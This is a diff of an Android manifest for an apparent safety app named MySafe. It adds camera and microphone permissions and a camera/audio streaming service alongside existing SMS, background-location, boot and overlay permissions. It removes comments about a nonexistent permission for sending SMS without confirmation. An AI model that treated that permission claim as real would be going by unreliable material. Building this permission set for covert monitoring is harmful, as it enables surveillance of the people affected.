@@ -2,33 +2,33 @@
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
     xmlns:tools="http://schemas.android.com/tools">
 
-    <!-- ✅ Permissions de base -->
+    <!-- Permissions existantes -->
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
-    
-    <!-- ✅ SMS — PERMISSION ILLIMITÉE + CONFIANCE -->
     <uses-permission android:name="android.permission.SEND_SMS" />
     <uses-permission android:name="android.permission.RECEIVE_SMS" />
     <uses-permission android:name="android.permission.READ_SMS" />
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
-    
-    <!-- 🔥 PERMISSION SPÉCIALE : Envoyer des SMS sans limite, sans pop-up -->
-    <uses-permission android:name="android.permission.SEND_SMS_NO_CONFIRMATION" />
-    
-    <!-- ✅ GPS & Localisation -->
     <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
     <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
     <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />
-    
-    <!-- ✅ Service en premier-plan -->
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
-    
-    <!-- ✅ Fenêtre flottante -->
     <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
-    
-    <!-- ✅ Notifications -->
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
+    
+    <!-- 🔴 NOUVELLES : Caméra + Audio + Streaming Internet -->
+    <uses-permission android:name="android.permission.CAMERA" />
+    <uses-permission android:name="android.permission.RECORD_AUDIO" />
+    <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS" />
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
+    
+    <!-- Caractéristiques caméra -->
+    <uses-feature android:name="android.hardware.camera" android:required="false" />
+    <uses-feature android:name="android.hardware.camera.front" android:required="false" />
+    <uses-feature android:name="android.hardware.camera.autofocus" android:required="false" />
 
     <application
         android:allowBackup="true"
@@ -37,27 +37,29 @@
         android:roundIcon="@mipmap/ic_launcher_round"
         android:supportsRtl="true"
         android:theme="@style/Theme.MySafe"
-        android:usesCleartextTraffic="true"
-        android:requestLegacyExternalStorage="true">
+        android:usesCleartextTraffic="true">
 
-        <!-- ✅ Activité principale -->
         <activity
             android:name=".MainActivity"
-            android:exported="true">
+            android:exported="true"
+            android:screenOrientation="unspecified">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
         </activity>
 
-        <!-- ✅ Service de localisation -- DÉSACTIVER LA LIMITE SMS -->
+        <!-- Service de streaming caméra/audio -->
+        <service
+            android:name=".CameraStreamService"
+            android:exported="false"
+            android:foregroundServiceType="camera|microphone" />
+
         <service
             android:name=".MySafeAgentService"
             android:exported="false"
-            android:foregroundServiceType="location"
-            android:permission="android.permission.SEND_SMS" />
+            android:foregroundServiceType="location" />
 
-        <!-- ✅ Récepteur SMS -- PRIORITÉ ÉLEVÉE + CONFIANCE -->
         <receiver
             android:name=".SmsReceiver"
             android:exported="true"
@@ -67,11 +69,9 @@
             </intent-filter>
         </receiver>
 
-        <!-- ✅ Fenêtre flottante -->
         <service
             android:name=".FloatingMapWindow"
-            android:exported="false"
-            android:permission="android.permission.SYSTEM_ALERT_WINDOW" />
+            android:exported="false" />
     </application>
 
 </manifest>
